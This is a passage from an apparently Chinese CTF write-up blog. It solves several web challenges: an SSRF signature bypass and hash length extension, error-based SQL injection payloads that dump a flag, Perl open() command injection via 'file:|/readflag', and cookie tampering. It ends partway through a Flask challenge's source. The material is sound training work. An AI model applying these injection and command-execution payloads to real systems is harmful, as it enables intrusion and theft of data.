class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()): # checkSign利用self.param和self.action的md5值和self.sign比对</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param) # urlopen一个self.param，并且返回前50位的内容</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp) # 结果写入result.txt</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read() # 读取result.txt的内容</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure>
<p>大致分析一下，可以发现题目应该是要求我们读取flag文件的内容，而要读取内容就要执行Task类的Exec内的scan和read。<br>而要进入scan和read还要过checkSign()这一关。跟进这个函数，发现是对比了md5(secert_key + self.action + self.param)和self.sign的值.<br>只要过了这一关就可以读取任意文件内容了。<br>再往下看，有一个geneSign的路由，路由根据我们传入的param来生成sign，这个sign在/De1ta路由中作为参数和传入的action,param的值比较，相等即可读取文件。<br>但是这里有一个问题，写死了action为scan。<br>再看读取文件的Exec函数是怎么读取文件的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def Exec(self):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[&apos;code&apos;] = 500</span><br><span class="line">    if (self.checkSign()): # checkSign利用secert_key,self.param和self.action的md5值和self.sign比对</span><br><span class="line">        if &quot;scan&quot; in self.action:</span><br><span class="line">            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">            resp = scan(self.param) # urlopen一个self.param，并且返回前50位的内容</span><br><span class="line">            if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                result[&apos;data&apos;] = resp</span><br><span class="line">            else:</span><br><span class="line">                print resp</span><br><span class="line">                tmpfile.write(resp) # 结果写入result.txt</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[&apos;code&apos;] = 200</span><br><span class="line">        if &quot;read&quot; in self.action:</span><br><span class="line">            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">            result[&apos;code&apos;] = 200</span><br><span class="line">            result[&apos;data&apos;] = f.read() # 读取result.txt的内容</span><br><span class="line">        if result[&apos;code&apos;] == 500:</span><br><span class="line">            result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">    else:</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">    return result</span><br></pre></td></tr></table></figure>
<p>注意到scan的执行条件判断是in而不是==。也就是说action可以是包含scan的任何字符串，只要有scan在里面就能执行scan操作。<br>还注意到scan和read是可以同时执行的，如果你的action是包含scan和read的字符串比如scanread，就可以同时执行写入和读取。<br>然后分析一下/De1ta路由和/geneSign路由</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>
<p>这里从cookie读取了action和sign两个参数，从查询字段部分读取了param,没有就置空。<br>随后根据这些参数创建一个task对象，然后调用Exec函数。<br>刚才说过，为了能让Exec函数执行scan和read操作，传入的sign值必须和hashlib.md5(secert_key + param + action).hexdigest()相等。<br>这里就必须利用geneSign路由生成一个sign传上去才行了。<br>尝试读一下/etc/passwd然后执行scan操作。<br>生成sign的时候只传了param为/etc/passwd。于是我们生成的sign是hashlib.md5(secert_key + ‘/etc/passwd’ + ‘scan’).hexdigest()<br>在访问/De1ta的时候把生成的sign通过cookie传上去，action传scan，param传/etc/passwd<br>然后就能成功通过checkSign()的检查执行scan操作，可以看到返回了200状态码。<br><img src="https://i.loli.net/2020/04/03/kuI8YZRcis9Db52.png" alt="Snipaste_2020-04-03_23-12-13.png"><br>这里也可以用这个方法来探测flag文件的位置。一般来说flag文件基本为flag,flag.txt,flag.php。<br>在根目录下尝试了三次不行，最后发现本目录下有个flag.txt，应该就是想办法读取这个文件了。</p>
<hr>
<p>这里我其实前面审计代码的时候没看清，以为scan和read是if-else关系，感觉自己不会了就去看wp了<br><a href="https://www.jianshu.com/p/eb60c856f2a3" target="_blank" rel="noopener">传送门</a><br>然后发现生成sign的时候其实有漏洞，这样简单拼接生成的sign是可以绕过检查的。<br>比如在geneSign页面传参param=flag.txtread,那么生成的sign为<br>hashlib.md5(secert_key + ‘flag.txtread’ + ‘scan’).hexdigest()<br>再到主页面传参<br>action=readscan<br>param=flag.txt<br>等下checkSign的时候生成的sign为<br>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest()<br>是一样的，就可以进入下一步。<br>而这里action已经是readscan了，就可以同时执行scan和read，同时param为flag.txt，于是成功拿到flag。<br>但是这个也不是预期解，为了学到更多，看预期解是怎么样解题的。</p>
<hr>
<p>原题解用到了哈希长度扩展攻击，具体参考本题wp开头给的链接。<br>其实简单总结一下就是知道了secret_key的长度，然后可以自己推断出hash值。<br>而这里hash值和生成hash值的数据都是受我们控制的，于是可以实行这种攻击。<br>简单介绍一下hashpump的用法，首先要有一个已知的签名值，比如本题的hashlib.md5(secert_key + flag.txt + action).hexdigest()为32c6f6129d38cb7401f7de3fe89671a8<br>然后要输入得到这个sign的数据，这里是flag.txtscan。<br>还要输入key的长度，本题为16.<br>最后加上想要添加的数据，本题当然为read。<br><img src="https://i.loli.net/2020/04/07/xs3hLwOQ2crM9VX.png" alt="Snipaste_2020-04-07_22-21-40.png"><br>得到输出的签名值，也就是本题的sign。然后把<code>\x</code>换为%(因为解数据的时候urldecode一下)。<br>最后提交的时候提交param=flag.txt，action为里把flag.txt去掉即可。<br>最后,其实不知道data也是可以正确填充的，但是数据长度要一样。</p>
<blockquote>
<p>这里说一下个人想法：其实不需要message的内容，只需知道长度就可以正确填充了，而且hash摘要值也是不受影响的。比如md5，只要初始链变量确定了，md5的值只受64字节后添加的字符串的影响，secret||message的长度只是影响第57-64字节的填充。所以hashpump只要在Input Data 处输入任意字符但正确长度的字符串就OK了，也可以做到不知道message内容而正确填充的功能</p>
</blockquote>
<h3 id="总结-22"><a href="#总结-22" class="headerlink" title="总结"></a>总结</h3><p>这道题又学到新东西了，感觉很好，多谢表哥们。</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>知识点</p>
<ul>
<li>报错注入</li>
<li>()绕过空格过滤</li>
</ul>
<hr>
<p>进去还是那个登录页面。随便用单引号试试发现有语法错误，得知注入点。<br>随便fuzz一下，发现很多函数都没得用了。空格和注释也被过滤了，这个可以用()绕过。=也不能用，但是like能用就行。<br>尝试报错注入。payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(version())),0x7e)))#</span><br></pre></td></tr></table></figure>
<p>密码随便填。<br>发现有效，接下来就按部就班拿表名列名查数据就行了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))#   拿表名</span><br><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&apos;H4rDsq1&apos;)),0x7e)))# 列名</span><br><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(group_concat(username))from(H4rDsq1)),0x7e)))# 用户名为flag</span><br><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(left(group_concat(password),30))from(H4rDsq1)),0x7e)))# 密码就是flag</span><br><span class="line">admin&apos;or(extractvalue(1,concat(0x7e,(select(right(group_concat(password),30))from(H4rDsq1)),0x7e)))# flag&#123;e7566a51-2189-4d49-97c6-b4d012222ae1&#125;</span><br></pre></td></tr></table></figure>
<p>这里值得注意的是读flag的时候，由于substr和mid和substring都被过滤了，所以没思路读取完整flag。<br>最后去看了别人的方法，利用了left和right两个函数分别去读flag左边和右边的30个字符，拼接一下就得到flag了。<br>参考链接<a href="https://www.cnblogs.com/wangtanzhi/p/12257412.html" target="_blank" rel="noopener">传送门</a></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>知识点</p>
<ul>
<li>GET命令的命令注入</li>
<li>利用GET反弹shell</li>
</ul>
<hr>
<p>进去给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&apos;,&apos;, $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">        $_SERVER[&apos;REMOTE_ADDR&apos;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>审计一下发现可以利用GET读任意文件然后写入filename里面。<br>文件路径可以用给出的ip和orange算出。<br>尝试读取/etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=/etc/passwd&amp;filename=test.txt 读取passwd内容到沙盒下的test.txt，这里不新建文件夹，只新建文件</span><br><span class="line">/sandbox/a577e17ecd2d20a6fa25aaa76484b667/test.txt //访问内容</span><br></pre></td></tr></table></figure>
<p>然后尝试读取/flag,/flag.txt,/flag.php都不成功。<br>随便输入一个路径发现是apache的。那就在/var/www/html下读取，也不成功。<br>看wp。</p>
<hr>
<p>这里其实GET命令是通过perl来执行的，而且可以读目录。也就是说可以读/。<br><img src="https://i.loli.net/2020/04/09/PeyYIzQpFHl8R1O.png" alt="Snipaste_2020-04-09_08-55-01.png"><br>发现根目录下有readflag.<br>那只一般就是想办法执行这个readflag来读取flag了。这里GET命令有一个任意命令读取的问题。<br>其知识点是，另外一个命令注入，是perl的feature，在open下可以执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@irrik:~/Desktop# cat test.pl </span><br><span class="line">open(FD,&quot;whoami|&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@irrik:~/Desktop# perl test.pl </span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>测试一下是可以执行命令的。<br>而GET对协议处理部分调用的是 /usr/share/perl5/LWP/Protocol下的各个pm模块，通过查询可以发现在file.pm中，path参数是完全可控的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"># URL OK, look at file</span><br><span class="line">my $path  = $url-&gt;file;</span><br><span class="line"></span><br><span class="line"># test file exists and is readable</span><br><span class="line">unless (-e $path) &#123;</span><br><span class="line">return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">              &quot;File `$path&apos; does not exist&quot;);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"># read the file</span><br><span class="line">if ($method ne &quot;HEAD&quot;) &#123;</span><br><span class="line">open(F, $path) or return new</span><br><span class="line">    HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">           &quot;Cannot read file &apos;$path&apos;: $!&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到对路径是否存在进行了判断(unless一句)，如果存在才会oepn这个path。<br>而这个path我们是可控的，所以可以控制命令的执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@irrik:~/Desktop# GET file:|/test.pl</span><br><span class="line">bash: /test.pl: Permission denied</span><br></pre></td></tr></table></figure>
<p>可以看到这样会尝试执行根目录下的/test.pl文件，虽然这里权限不够没执行成功，但是我们可以想办法执行本题的/readflag啊。<br>要执行首先要让路径判断过关，所以payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 新建一个bash%20-c%20/readflag|文件</span><br><span class="line">http://13.115.136.15/?url=xxx&amp;filename=|/readflag</span><br><span class="line">2. open文件，并触发命令执行，执行readflag，并将数据写入flag</span><br><span class="line">http://13.115.136.15/?url=file:|/readflag&amp;filename=flag</span><br><span class="line">3. 访问sandbox下的flag，获得flag</span><br><span class="line">http://13.115.136.15/sandbox/5d4ef0aebfb2070eb64c89b752d7ce89/flag</span><br></pre></td></tr></table></figure>
<p>这里新建文件的时候不可以去掉/(去掉/的话就变成了只新建一个|readflag文件)或者不新建，会不执行。<br>当传递参数file:|/readflag的时候，会先判断<code>|/readflag</code>是否存在，如果存在就执行/readflag.<br>可以看出来第一次把|当成了目录名，而第二次open的时候当成了管道符来处理，于是会执行根目录下的readflag<br>这里其实还有另一个解法，是一个CVE漏洞。<br>参考wp。但是由于题目代码的问题(原题是先   @mkdir($sandbox);@chdir($sandbox);)所以可以触发这个cve。<br>但是复现的时候没有先换目录，所以触发不了这个cve，也就不能弹后门了。<br>参考<a href="https://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">传送门</a></p>
<h3 id="总结-23"><a href="#总结-23" class="headerlink" title="总结"></a>总结</h3><p>这道题一复现cve的时候没注意代码的问题，浪费了不少时间，这个代码这么写应该是触发不了cve的。<br>大家解题可能也都是利用perl的open的feature来解题的。</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>知识点</p>
<ul>
<li>cookie 抓包修改<br>进去提示要用admin登录。<br>然后还提示了一个账号，cookie/monster。<br>用这个账号登录一下，发现cookie处多了一个cookie记录。username=cookie.改成admin刷新就拿到flag了。<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>知识点</li>
<li>逻辑漏洞</li>
</ul>
<hr>
<p>进去给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, request, Response</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = &apos;*********************&apos;  # censored</span><br><span class="line">url_prefix = &apos;/d5afe1f66147e857&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def FLAG():</span><br><span class="line">    return &apos;*********************&apos;  # censored</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def trigger_event(event):</span><br><span class="line">    session[&apos;log&apos;].append(event)</span><br><span class="line">    if len(session[&apos;log&apos;]) &gt; 5:</span><br><span class="line">        session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">    if type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    else:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_mid_str(haystack, prefix, postfix=None):</span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    if postfix is not None:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    return haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RollBackException:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def execute_event_loop():</span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)</span><br><span class="line">    resp = None</span><br><span class="line">    while len(request.event_queue) &gt; 0:</span><br><span class="line">        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br><span class="line">        event = request.event_queue[0] </span><br><span class="line">        request.event_queue = request.event_queue[1:]</span><br><span class="line">        if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)):</span><br><span class="line">            continue</span><br><span class="line">        for c in event:</span><br><span class="line">            if c not in valid_event_chars:</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            is_action = event[0] == &apos;a&apos;</span><br><span class="line">            action = get_mid_str(event, &apos;:&apos;, 